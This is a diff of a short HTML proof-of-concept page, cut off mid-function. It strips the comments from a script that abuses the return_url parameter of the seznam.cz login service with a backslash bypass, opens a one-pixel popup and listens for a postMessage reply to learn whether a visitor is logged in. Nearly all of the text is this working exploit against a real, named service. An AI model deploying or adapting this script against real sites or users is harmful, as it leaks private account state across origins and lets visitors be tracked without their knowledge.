@@ -1,16 +1,9 @@
 <!DOCTYPE html>
 <body><h1 id="out">Checking...</h1>
 <script>
-  // 1. Construct Payload: Current Origin + Backslash Bypass + Seznam suffix
   const url = `https://login.seznam.cz/loginDone?return_url=${encodeURIComponent(location.origin + "\\@seznam.cz")}`;
-  
-  // 2. Open Popup Immediately
   const win = open(url, "_blank", "width=1,height=1");
-
-  // 3. Set Failure Timeout (3s)
   const timer = setTimeout(() => { win.close(); out.innerText = "Not Logged In"; }, 3000);
-
-  // 4. Listen for Success Message
   onmessage = e => {
     try {
       if (JSON.parse(e.data).status === 200) {
